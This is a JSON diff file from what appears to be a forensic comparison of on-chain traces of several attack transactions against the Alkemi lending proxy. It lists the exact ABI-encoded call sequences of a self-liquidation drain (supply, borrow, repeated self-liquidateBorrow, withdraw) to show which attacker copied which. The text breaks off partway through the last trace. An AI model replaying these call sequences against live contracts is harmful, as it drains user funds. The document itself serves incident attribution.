@@ -1,0 +1,904 @@
+{
+ "schema": "bvh-replay-diff/1",
+ "slug": "alkemi-2026",
+ "method": "callTracer traces (debug_traceTransaction on eth.drpc.org) of the Alkemi proxy 0x4822d917 calls, `markets()` views dropped, the calling contract's own address replaced by <SELF> in call arguments; state-changing calls = supply/borrow/liquidateBorrow/withdraw.",
+ "state_changing_call_counts": {
+  "yoink": 18,
+  "t46": 16,
+  "comp": 6,
+  "dhl": 4
+ },
+ "identical_prefix_lengths": {
+  "yoink_vs_t46": 16,
+  "yoink_vs_comp": 0,
+  "yoink_vs_dhl": 0,
+  "comp_vs_dhl": 0
+ },
+ "yoink_vs_t46_summary": "All 16 state-changing Alkemi calls of the reverted deploy+attack tx 0x726bd90c (block 24627180 idx 226, EOA 0x46c403e3) are byte-identical (selector, ETH value, arguments with the caller address normalised) to the first 16 of Yoink's 18: supply(WBTC, 1e8 sat), supply(ETH vault, 2.5 ETH), then 7x [borrow(ETH vault, 2.0 ETH); liquidateBorrow(self, ETH vault, WBTC, value 2.002 ETH)]. The attacker's tx fails inside the 7th liquidateBorrow (out of gas, 14,344,401 of 14,974,454 gas); Yoink's tx adds the two withdraw calls and succeeds.",
+ "t46_first_failed_state_changing_call_index": 15,
+ "yoink_vs_message_sender_summary": "The message sender's tx 0xd4ec3e34 runs a different program: helper supply(ETH vault, 43.45395) + borrow(WBTC, <all WBTC available>) followed by the DHL-style supply 50 / borrow 39.5 / liquidateBorrow(self, 39.5395) / withdraw(max). 0 of its calls match Yoink's.",
+ "yoink_vs_dhl_summary": "DHL's tx (supply 50 ETH, borrow 39.5, self-liquidate 39.5395, withdraw max) shares no call with Yoink's tx.",
+ "calls": {
+  "yoink": [
+   {
+    "sel": "supply",
+    "value_wei": 0,
+    "args": "0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000000000000005f5e100",
+    "failed": false
+   },
+   {
+    "sel": "supply",
+    "value_wei": 2500000000000000000,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab00000000000000000000000000000000000000000000000022b1c8c1227a0000",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "withdraw",
+    "value_wei": 0,
+    "args": "0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000000000000007be81b5",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "withdraw",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab00000000000000000000000000000000000000000000000022b1c8c1227a0000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   }
+  ],
+  "t46": [
+   {
+    "sel": "supply",
+    "value_wei": 0,
+    "args": "0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000000000000005f5e100",
+    "failed": false
+   },
+   {
+    "sel": "supply",
+    "value_wei": 2500000000000000000,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab00000000000000000000000000000000000000000000000022b1c8c1227a0000",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000001bc16d674ec80000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 2002000000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000001bc8886498550000",
+    "failed": true
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   }
+  ],
+  "comp": [
+   {
+    "sel": "supply",
+    "value_wei": 43453950000000000000,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000000000000000000000000000025b0b714bcd95e000",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c5990000000000000000000000000000000000000000000000000000000000000000",
+    "failed": false
+   },
+   {
+    "sel": "supply",
+    "value_wei": 50000000000000000000,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab000000000000000000000000000000000000000000000002b5e3af16b1880000",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab000000000000000000000000000000000000000000000002242c30b853ee0000",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
+    "value_wei": 39539500000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab00000000000000000000000000000000000000000000000224b885c2c08ec000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "withdraw",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40abffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   }
+  ],
+  "dhl": [
+   {
+    "sel": "supply",
+    "value_wei": 50000000000000000000,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab000000000000000000000000000000000000000000000002b5e3af16b1880000",
+    "failed": false
+   },
+   {
+    "sel": "borrow",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab000000000000000000000000000000000000000000000002242c30b853ee0000",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "liquidateBorrow",
